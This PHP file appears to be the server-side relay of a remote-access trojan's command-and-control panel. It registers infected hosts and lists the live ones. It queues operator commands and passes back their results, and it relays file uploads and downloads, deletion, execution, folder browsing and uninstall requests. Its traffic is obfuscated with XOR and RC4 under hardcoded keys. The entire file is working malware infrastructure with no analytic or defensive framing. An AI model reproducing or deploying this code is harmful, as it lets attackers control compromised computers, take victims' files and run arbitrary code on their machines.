<?php
session_id("xxx"); 
session_start(); 
//Header( "Content-Type:text/html; charset=gb2312\n\n");
error_reporting(3);
//echo("welcom to logon.php first!\n\n");
$qlen = 0;
$q_str = $_SERVER["QUERY_STRING"];
$method = $_SERVER["REQUEST_METHOD"];

if($method == "GET"){
    $q_str = $_SERVER["QUERY_STRING"];
}else if($method == "POST"){
    $q_str = file_get_contents("php://input");
	
	$key = 'fuck crackers who want to crack this program!';
	
	$q_str = xor_crypt($q_str,$key); 

}

$Sig = substr($q_str,0,3);

if($Sig == "php")
{
	$qlen = strlen($q_str);
    $Pasw = "38$@g0d><c53^&L5";
    $q_str = substr($q_str,3,$qlen-3);
    $q_str = rc4_data($Pasw,$q_str);
}

//$q_str = urldecode($q_str)
//$q_str = base64_decode($q_str)

$qlen = strlen($q_str);
if($qlen >= 12){
    $start = substr($q_str,0,4); 
    $end = substr($q_str,$qlen-4,4);
    //echo "---Start:".$start."---End:".$end."\n\n";
    if($start == "Data" and $end =="Data"){
	$q_str = substr($q_str,4, $qlen-8);
	//echo "Q_str:".$q_str."\n\n";
	$cmd = substr($q_str,0,4);
	switch($cmd){
	case "$$00":
	    online($q_str,$qlen);break;
	case "$$30":
	    ret_success();break; 
	case "$$01":
	    query_operate($q_str,$qlen);break;
	case "$$02":
	    get_host($q_str,$qlen);break;
	case "$$03":
	    remote_logon($q_str,$qlen);break;
	case "$$04":
	    send_driver($q_str,$qlen);break;
	case "$$05":
	    get_driver($q_str,$qlen);break;
	case "$$06":
	    query_folder($q_str,$qlen);break; 
	case "$$07":
	    send_folder($q_str,$qlen);break;
	case "$$08":
	    get_folder($q_str,$qlen);break;
	case "$$23":
	    clear_up_status($q_str,$qlen);break;
	case "$$0a":
	    send_up_data($q_str,$qlen);break;
	case "$$09":
	    send_up_cmd($q_str,$qlen);break;
	case "$$0b":
	    get_up_data($q_str,$qlen);break;
	case "$$25":
	    query_up_status($q_str,$qlen);break;
	case "$$24":
	    update_up_status($q_str,$qlen);break;
	case "$$19":
	    clean_dd_record($q_str,$qlen);break;
	case "$$0c":
	    start_download($q_str,$qlen);break;
	case "$$0f":
	    update_dd_status($q_str,$qlen);break;
	case "$$0d":
	    send_dd_data($q_str,$qlen);break;
	case "$$0e":
	    get_dd_data($q_str,$qlen);break;
	case "$$10":
	    query_dd_status($q_str,$qlen);break;
	case "$$11":
	    start_cmd($q_str,$qlen);break;
	case "$$12":
	    send_cmd_result($q_str,$qlen);break;
	case "$$13":
	    get_cmd_result($q_str,$qlen);break;
	case "$$14":
	    send_cmd($q_str,$qlen);break;
	case "$$15":
	    get_cmd($q_str,$qlen);break;
	case "$$16":
	    delete_file($q_str,$qlen);break;
	case "$$17":
	    execute_file($q_str,$qlen);break;
	case "$$20":
	    delete_host_record($q_str,$qlen);break;
	case "$$22":
	    uninstall($q_str,$qlen);break;
	case "$$29":
	    CopyFolder($q_str,$qlen);break;
    case "$$26":
	    MoveFile($q_str,$qlen);break;
    case "$$28":
	    ReNameFile($q_str,$qlen);break;
    case "$$27":
        FileSata($q_str,$qlen);break;
    case "$$31":
        Create_File($q_str,$qlen);break;
    case "$$32":
        WriteFileSata($q_str,$qlen);break;
		
	case "$$34":
        bringCommand($q_str,$qlen);break;
		
	case "$$35":
        fetchCommand($q_str,$qlen);break;
		
	case "$$36":
        putCommandResult($q_str,$qlen);break;
		
	case "$$37":
        takeCommandResult($q_str,$qlen);break;
	}
  }
}
/* 
 * echo Data and return
 */

function  FileSata($qstr,$qlen)
{
    $id_path = get_id_path($qstr);

    $fixname = "FileSatar";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);


    ret_success();
}

function  WriteFileSata($qstr,$qlen)
{
    $id_path = get_id_path($qstr);
    $fixname = "FileSatar";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();
}


function xor_enc($data,$key)
{
	$crytxt = '';
	$keylen = strlen($key);
	
	$len = strlen($data);
	
	for($i=0;$i<$len;$i++)
	{   
		$k = $i%$keylen;
		$crytxt .= $data[$i] ^ $key[$k];
	}
	return $crytxt;
}



function xor_crypt($data,$key)
{
	$newdata = '';
	
	$len = strlen($data);
	//$key = 'fuck crackers who want to crack this program!';
	
	$keylen = strlen($key);

	for($i = 0,$j=0;$i < $len;$i++)
	{	
		$newdata .= ($data[$i]) ^ ($key[$j]);
		$j ++;
		if($j >= $keylen)
		{		
			$j = 0;
		}
	}
	
	return $newdata;
}


function rc4_data ($pwd, $data)
{
	$key[] ="";
	$box[] ="";

	$pwd_length = strlen($pwd);
	$data_length = strlen($data);

	for ($i = 0; $i < 256; $i++)
	{
		$key[$i] = ord($pwd[$i % $pwd_length]);
		$box[$i] = $i;
	}

	for ($j = $i = 0; $i < 256; $i++)
	{
		$j = ($j + $box[$i] + $key[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for ($a = $j = $i = 0; $i < $data_length; $i++)
	{
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;

		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;

		$k = $box[(($box[$a] + $box[$j]) % 256)];
		$cipher .= chr(ord($data[$i]) ^ $k);
	}

	return $cipher;
}

function ret_success(){
    echo "Data";
    return 0;
}

function touch_ready_file($path){
    touch($path) or die("Atad");
}

function readable_ready_delete($path){
    is_readable($path) or die("Atad");
    unlink($path);
}

function get_hostname($str){
    $offset = 4;
    $hlen_str = substr($str,$offset,1);
    $hlen_int = unpack("C",$hlen_str);
    $hlen = $hlen_int[1];
    $offset += 1;
    $hostname = substr($str,$offset, $hlen);
    return $hostname;
}


function get_hostname2($str){
    $offset = 4;
    $hlen_str = substr($str,$offset,1);
    $hlen_int = unpack("C",$hlen_str);
    $hlen = $hlen_int[1];
    $offset += 1;
	
    $hostname = substr($str,$offset, $hlen);
	
	$offset += $hlen;
	$hlen_str = substr($str,$offset,1);
    $hlen_int = unpack("C",$hlen_str);
    $hlen = $hlen_int[1];
    $offset += 1;
	
	$hostname = substr($str,$offset, $hlen);
    return $hostname;
}

    
function get_id_path($str){
	//$offset = 4;
    //$offset += 1;
	//$hostname = substr($str,$offset, 16);
	
	$hostname = get_hostname($str);
	
	//echo "hostname:".$hostname."\n\n";

    $indentify = md5($hostname);
    $id_path = "./".$indentify."/";
	
	//echo "id_path:".$id_path."\n\n";

    if (!file_exists($id_path))
	mkdir($id_path);

    return $id_path;
}

function clean_old_file($tpath){
    if(is_writeable($tpath)){
	unlink($tpath) or die ("Atad");
    }
}

function read_from_file($tpath){
	//echo "Data\n\n";
    $qss = $_SESSION[$tpath];
    echo $qss;
    unset($_SESSION[$tpath]);
}

function write_to_file($tpath, $wstr){
	$cmd = substr($wstr, 0, 4);
	$hostname = get_hostname($wstr);
	//echo "hostname:".$hostname;
	$offset = 4 + 1 + strlen($hostname);
	$content = substr($wstr, $offset, strlen($wstr)-$offset);
	$wtstr = $cmd.$content;
	//echo "wtstr:".$wtstr;
	$_SESSION[$tpath] = $wtstr;

}




function file_put_writex($tpath, $wstr){
    $fp = fopen($tpath,"wb+");
    if ($fp){
        fwrite($fp, $wstr);
        fclose($fp);
        return 1;
    }
    return 0;
}

function write_up_data($tpath, $wstr){
    $fp = fopen($tpath,"wb+");
    if ($fp){
	fclose($fp);
	file_put_writex($tpath, $wstr);
    }else{
	dir("Atad");
    }
}



function online($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "sysinfo";
    $tpath = $id_path.$fixname;

    $offset = 4;
    //$info = substr($qstr,$offset,$qlen-$offset);
	$info = substr($qstr,$offset,$qlen-$offset);

    $ip = $_SERVER["REMOTE_ADDR"];
    $ip_len = pack("C",strlen($ip));
    
    $time = date("Y-m-d H:i:s",time());
    $time_len = pack("C",19);
    
    $info .= $ip_len.$ip;
    $info .= $time_len.$time;
	
	//echo $info."\n\n";

    if (file_put_writex($tpath,$info)){
		echo "Data";	
		fetchCommand($qstr);	
    }else{
		dir("Atad");
    }
	
    return 0;
}

function query_operate($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "sysinfo";
    $tpath = $id_path.$fixname;
    if (is_writeable($tpath)){
	$info =  file_get_contents($tpath);
	$info_len = strlen($info);
	$info = substr($info,0,$info_len-19).date("Y-m-d H:i:s",time());
	file_put_writex($tpath, $info);
	
	//echo $tpath."is_writeable ";
    }else{
		//echo $tpath."is_writeable not";
	die("Aatd");
    }
    
    $fixname= "anyr";
    $tpath = $id_path.$fixname;				
    readable_ready_delete($tpath);
	
    $fixname= "any";
    $tpath = $id_path.$fixname;	
    read_from_file($tpath);

    ret_success();    
}







function bringCommand($qstr,$qlen)
{
	$path = get_id_path($qstr)."command/";
	if(!is_dir($path) ){
		mkdir($path,0777,true);
	}
	
	$server = get_hostname2($qstr);

	$tpath = $path.$server;
	
	//echo $tpath;
	
	//echo $path
	
	//echo $server
	
	file_put_writex($tpath,$qstr);
	
	//$_SESSION[$tpath] = $qstr;
	
	ret_success(); 
}



function fetchCommand($qstr,$qlen){

	$path = get_id_path($qstr);
	
	$tpath = $path."command/";
	
	$filenames = glob($tpath."*");	//*.* is different to *
	
	if(count($filenames) > 0){
	    foreach($filenames as $filename){
			//echo $filename;
			if(is_file($filename)){
				if (is_readable($filename)){
					$result = file_get_contents($filename);
					echo($result);
					unlink($filename);
					ret_success(); 
				}
			}
	    }
	}
}

function putCommandResult($qstr,$qlen){
	
	$path = get_id_path($qstr)."commandResult/";
	
	$server = get_hostname2($qstr);
	
	$tpath = $path.$server;

	$_SESSION[$tpath] = $qstr;
	
	ret_success(); 
}

function takeCommandResult($qstr,$qlen)
{
	$path = get_id_path($qstr);
	
	$server = get_hostname2($qstr);
	
	$tpath = $path."commandResult/".$server;
	
	$qss = $_SESSION[$tpath];
    echo "Data".$qss."Data";
    unset($_SESSION[$tpath]);
}








function  get_host($qstr,$qlen){
    $queryType = substr($qstr,4,4);
    $extname = "/sysinfo";
    
    if ($queryType == "allh"){
	echo "Data";
	$filenames = glob('./'."*");
	
	if(count($filenames) > 0){
	    foreach($filenames as $filename){
			//echo $filename;
		if(is_dir($filename)){
		    $filename = $filename.$extname;
		    if (is_readable($filename)){
			$result = file_get_contents($filename);
			echo($result."@@@");
		    }
		}
	    }
	}
    }else if ($queryType == "live"){
	echo "Data";
	$filenames = glob('./'."*");
	foreach($filenames as $filename){
	    if(is_dir($filename)){
		$filename = $filename.$extname;
		if (is_readable($filename)){
		    $result = file_get_contents($filename);
			//echo $filename;
			//echo $result;
		    $tmFormat1 = substr($result,strlen($result)-19,19);
		    $tmFormat2 = date("Y-m-d H:i:s",time());
			//echo '1:'.$tmFormat1.'2:'.$tmFormat2;
			
		    if(strtotime($tmFormat2) - strtotime($tmFormat1) <= 60)
			echo($result."@@@");
		}
	    }
	}
    }

    ret_success();
}

function remote_logon($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $tpath = $id_path."any";
    write_to_file($tpath,$qstr);

    $fixname = "driver";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);
    
    $fixname = "driverr";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();
}

function send_driver($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "driver";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);
    
    $fixname = "driverr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();
}

function get_driver($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "driverr";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);

    $fixname = "driver";
    $tpath = $id_path.$fixname;
    read_from_file($tpath);

    ret_success();
}

function  query_folder($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath,$qstr);

    $fixname = "folderr";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);

    $fixname = "folder";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();
}

function send_folder($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $fixname = "folder";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);
    
    $fixname = "folderr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();
}

function get_folder($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "folderr";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);

    $fixname = "folder";
    $tpath = $id_path.$fixname;
    read_from_file($tpath);

    ret_success();
}

function send_up_cmd($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);
    
    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();
}

function send_up_data($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "udata";
    $tpath = $id_path.$fixname;

    $hostname = get_hostname($qstr);
    $offset = 4 + 1 + strlen($hostname);
    $qstr = substr($qstr, $offset, $qlen-$offset);
    $_SESSION[$tpath] = $qstr;

    $fixname = "udatar";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function get_up_data($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "udatar";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);
    
    $fixname = "udata";
    $tpath = $id_path.$fixname;
    read_from_file($tpath);
    
    return 0;
}



function update_dd_status($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "ddstatus";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);
    
    $fixname = "ddstatusr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function clean_dd_record($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "ddatar";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);
    
    $fixname = "ddata";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);

    ret_success();    
}

function start_download($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath,$qstr);

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    		
}

function get_filename($qstr){
    $hostname = get_hostname($qstr);
    
    $offset = 4 + 1 + strlen($hostname);
    $path_len_str = substr($qstr,$offset,1);
    $path_len = unpack("C",$path_len_str);
    $path_len = $path_len[1];

    $offset += 1;
    $file_path = substr($qstr, $offset, $path_len);
    
    $arr =  explode('\\', $file_path);
    $filename = $arr[count($arr)-1];
	
	//echo $filename;

    return $filename;
}

function send_dd_data($qstr,$qlen){
	
	//echo 'qstr:'.$qstr;
	
    $id_path = get_id_path($qstr);
	
	//echo 'path:'.$id_path;

    $filename = get_filename($qstr);
	
	//echo 'filename:'.$filename;

    $tpath_copy = $id_path.$filename;
    write_to_file($tpath_copy,$qstr);
	
    $fixname = $filename."r";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);
		
    ret_success();
}

function get_dd_data($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $filename = get_filename($qstr);

    $fixname = $filename."r";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);
    
    $tpath = $id_path.$filename;
    read_from_file($tpath);

    ret_success();    
}

function query_dd_status($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "ddstatusr";
    $tpath = $id_path.$fixname;	
    readable_ready_delete($tpath);
    
    $fixname = "ddstatus";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);

    ret_success();    
}

function start_cmd($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "ctemp";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);

    $fixname = "ctempr";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);

    $fixname = "cdata";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);

    $fixname = "cdatar";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);

    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);//"$$11","");

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function send_cmd($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "ctemp";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);
    
    $fixname = "ctempr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    $fixname = "cdatar";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);
    
    $fixname = "cdata";
    $tpath = $id_path.$fixname;
    clean_old_file($tpath);

    ret_success();
}

function get_cmd($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "ctempr";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);
    
    $fixname = "ctemp";
    $tpath = $id_path.$fixname;
    read_from_file($tpath);
    
    ret_success();
}

function send_cmd_result($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $fixname = "cdata";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);
	
	echo 'send_cmd_result:'.$tpath;

    $fixname = "cdatar";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);
	
	

    ret_success();
}

function get_cmd_result($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "cdatar";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);
    
    $fixname = "cdata";
    $tpath = $id_path.$fixname;
    read_from_file($tpath);

    ret_success();
}

function delete_file($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function execute_file($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function Create_File($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);
	
	//echo "write file size:".$qlen."\n\n";

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function CopyFolder($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function MoveFile($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function ReNameFile($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function delete_host_record($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "sysinfo";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);

    ret_success();    
}

function uninstall($qstr,$qlen){
    $id_path = get_id_path($qstr);
    
    $fixname = "any";
    $tpath = $id_path.$fixname;
    write_to_file($tpath, $qstr);

    $fixname = "anyr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function clear_up_status($qstr,$qlen){
    query_up_status($qstr, $qlen);
}

function update_up_status($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "upstatus";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);
    
    $fixname = "upstatusr";
    $tpath = $id_path.$fixname;
    touch_ready_file($tpath);

    ret_success();    
}

function query_up_status($qstr,$qlen){
    $id_path = get_id_path($qstr);

    $fixname = "upstatusr";
    $tpath = $id_path.$fixname;	
    readable_ready_delete($tpath);
    
    $fixname = "upstatus";
    $tpath = $id_path.$fixname;
    readable_ready_delete($tpath);

    ret_success();    
}
?>